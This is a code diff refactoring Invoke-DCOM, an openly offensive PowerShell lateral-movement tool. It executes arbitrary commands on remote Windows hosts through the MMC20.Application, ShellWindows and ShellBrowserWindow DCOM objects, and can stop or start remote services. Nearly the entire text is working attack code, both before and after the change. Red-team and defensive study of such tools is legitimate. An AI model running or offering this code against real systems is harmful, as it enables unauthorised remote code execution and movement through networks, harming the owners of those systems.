@@ -1,174 +1,99 @@
-<#
-
-    DCOM Lateral Movement
-    Author: Steve Borosh (@rvrsh3ll)
-    License: BSD 3-Clause
-    Required Dependencies: None
-    Optional Dependencies: None
-
-#>
-
 function Invoke-DCOM {
 <#
-    .SYNOPSIS
+.SYNOPSIS
 
-        Execute's commands via various DCOM methods as demonstrated by (@enigma0x3)
-        http://www.enigma0x3.net
+Execute's commands via various DCOM methods as demonstrated by (@enigma0x3)
+http://www.enigma0x3.net
 
-        Author: Steve Borosh (@rvrsh3ll)        
-        License: BSD 3-Clause
-        Required Dependencies: None
-        Optional Dependencies: None
+Author  : Steve Borosh (@rvrsh3ll)        
+License : BSD 3-Clause
+Required Dependencies : None
+Optional Dependencies : None
 
-    .DESCRIPTION
+.DESCRIPTION
 
-        Invoke commands on remote hosts via MMC20.Application COM object over DCOM.
+Invoke commands on remote hosts via MMC20.Application COM object over DCOM.
 
-    .PARAMETER Target
+.PARAMETER Target
 
-        IP Address or Hostname of the remote system
+IP Address or Hostname of the remote system
 
-    .PARAMETER Type
+.PARAMETER Type
 
-        Specifies the desired type of execution
+Specifies the desired type of execution
 
-    .PARAMETER Command
+.PARAMETER Command
 
-        Specifies the desired command to be executed
+Specifies the desired command to be executed
 
-    .EXAMPLE
+.EXAMPLE
 
-        Import-Module .\Invoke-DCOM.ps1
-        Invoke-DCOM -Target '192.168.2.100' -Type MMC20 -Command "calc.exe"
-        Invoke-DCOM -Target '192.168.2.100' -Type ServiceStart "MyService"
+Invoke-DCOM -Target '192.168.2.100' -Method MMC20.Application -Command 'calc.exe'
+
+.EXAMPLE
+
+Invoke-DCOM -Target '192.168.2.100' -Method ServiceStart -ServiceName 'MyService'
+
 #>
-
-    [CmdletBinding()]
-    Param (
+[CmdletBinding()]
+    param (
         [Parameter(Mandatory = $true, Position = 0, ValueFromPipeLine = $true, ValueFromPipelineByPropertyName = $true)]
-        [String]
+        [string]
         $ComputerName,
 
         [Parameter(Mandatory = $true, Position = 1)]
-        [ValidateSet("MMC20", "ShellWindows","ShellBrowserWindow","CheckDomain","ServiceCheck","MinimizeAll","ServiceStop","ServiceStart")]
-        [String]
-        $Method = "MMC20",
+        [ValidateSet('MMC20.Application', 'ShellWindows','ShellBrowserWindow','CheckDomain','ServiceCheck','MinimizeAll','ServiceStop','ServiceStart')]
+        [string]
+        $Method = 'MMC20.Application',
 
-        [Parameter(Mandatory = $false, Position = 2)]
+        [Parameter(Position = 2)]
         [string]
         $ServiceName,
 
-        [Parameter(Mandatory = $false, Position = 3)]
+        [Parameter(Position = 3)]
         [string]
-        $Command= "calc.exe"
+        $Command = 'calc.exe'
     )
 
-    Begin {
+    begin {
 
-    #Declare some DCOM objects
-       if ($Method -Match "ShellWindows") {
-
-            [String]$DCOM = '9BA05972-F6A8-11CF-A442-00A0C90A8F39'
+        # Enumerate DCOM object guid
+        [String]$Dcom = switch ($Method) {
+            'MMC20.Application' { 'MMC20.Application' }
+                 'ShellWindows' { '9BA05972-F6A8-11CF-A442-00A0C90A8F39' }
+                        default { 'C08AFD90-F2A1-11D1-8455-00A0C91F3880' }
         }
+    }
+       
+    process {
         
-        elseif ($Method -Match "ShellBrowserWindow") {
-
-            [String]$DCOM = 'C08AFD90-F2A1-11D1-8455-00A0C91F3880'
-        }
-
-        elseif ($Method -Match "CheckDomain") {
-
-            [String]$DCOM = 'C08AFD90-F2A1-11D1-8455-00A0C91F3880'
-        }
-
-        elseif ($Method -Match "ServiceCheck") {
-
-            [String]$DCOM = 'C08AFD90-F2A1-11D1-8455-00A0C91F3880'
-        }
-
-        elseif ($Method -Match "MinimizeAll") {
-
-            [String]$DCOM = 'C08AFD90-F2A1-11D1-8455-00A0C91F3880'
-        }
-
-        elseif ($Method -Match "ServiceStop") {
-
-            [String]$DCOM = 'C08AFD90-F2A1-11D1-8455-00A0C91F3880'
-        }
-
-        elseif ($Method -Match "ServiceStart") {
-
-            [String]$DCOM = 'C08AFD90-F2A1-11D1-8455-00A0C91F3880'
-        }
-    }
-    
-    
-    Process {
-
-        #Begin main process block
-
-        #Check for which type we are using and apply options accordingly
-        if ($Method -Match "MMC20") {
-
-            $Com = [Type]::GetTypeFromProgID("MMC20.Application","$ComputerName")
-            $Obj = [System.Activator]::CreateInstance($Com)
-            $Obj.Document.ActiveView.ExecuteShellCommand($Command,$null,$null,"7")
-        }
-        elseif ($Method -Match "ShellWindows") {
-
-            $Com = [Type]::GetTypeFromCLSID("$DCOM","$ComputerName")
-            $Obj = [System.Activator]::CreateInstance($Com)
-            $Item = $Obj.Item()
-            $Item.Document.Application.ShellExecute("cmd.exe","/c $Command","c:\windows\system32",$null,0)
-        }
-
-        elseif ($Method -Match "ShellBrowserWindow") {
-
-            $Com = [Type]::GetTypeFromCLSID("$DCOM","$ComputerName")
-            $Obj = [System.Activator]::CreateInstance($Com)
-            $Obj.Document.Application.ShellExecute("cmd.exe","/c $Command","c:\windows\system32",$null,0)
-        }
-
-        elseif ($Method -Match "CheckDomain") {
-
-            $Com = [Type]::GetTypeFromCLSID("$DCOM","$ComputerName")
-            $Obj = [System.Activator]::CreateInstance($Com)
-            $Obj.Document.Application.GetSystemInformation("IsOS_DomainMember")
-        }
-
-        elseif ($Method -Match "ServiceCheck") {
-
-            $Com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","$ComputerName")
-            $Obj = [System.Activator]::CreateInstance($Com)
-            $obj.Document.Application.IsServiceRunning("$ServiceName")
-        }
-
-        elseif ($Method -Match "MinimizeAll") {
-
-            $Com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","$ComputerName")
-            $Obj = [System.Activator]::CreateInstance($Com)
-            $obj.Document.Application.MinimizeAll()
-        }
-
-        elseif ($Method -Match "ServiceStop") {
-
-            $Com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","$ComputerName")
-            $Obj = [System.Activator]::CreateInstance($Com)
-            $obj.Document.Application.ServiceStop("$ServiceName")
-        }
+        try { $DcomType = [Type]::GetTypeFromCLSID($Dcom, $ComputerName) }
+        catch { $DcomType = [Type]::GetTypeFromProgID($Dcom, $ComputerName) }
         
-        elseif ($Method -Match "ServiceStart") {
+        $DcomObject = [Activator]::CreateInstance($DcomType)
 
-            $Com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","$ComputerName")
-            $Obj = [System.Activator]::CreateInstance($Com)
-            $obj.Document.Application.ServiceStart("$ServiceName")
+        # Check for which type we are using and apply options accordingly
+        switch ($Method) {
+            'MMC20.Application' { $DcomObject.Document.ActiveView.ExecuteShellCommand($Command,$null,$null,'7') }
+
+            'ShellBrowserWindow' { $DcomObject.Document.Application.ShellExecute($env:ComSpec,"/c $Command",'c:\windows\system32',$null,0) }
+
+            'CheckDomain' { $DcomObject.Document.Application.GetSystemInformation('IsOS_DomainMember') }
+            
+            'MinimizeAll' { $DcomObject.Document.Application.MinimizeAll() }
+
+            'ServiceStop' { $DcomObject.Document.Application.ServiceStop($ServiceName) }
+        
+            'ServiceStart' { $DcomObject.Document.Application.ServiceStart($ServiceName) }
+     
+            'ServiceCheck' { $DcomObject.Document.Application.IsServiceRunning($ServiceName) }
+                   
+            'ShellWindows' {
+                $Item = $DcomObject.Item()
+                $Item.Document.Application.ShellExecute($env:ComSpec,"/c $Command",'c:\windows\system32',$null,0)
+            }
         }
     }
 
-    End {
-
-        Write-Output "Completed"
-    }
-    
-
+    end { Write-Verbose 'Completed.' }
 }
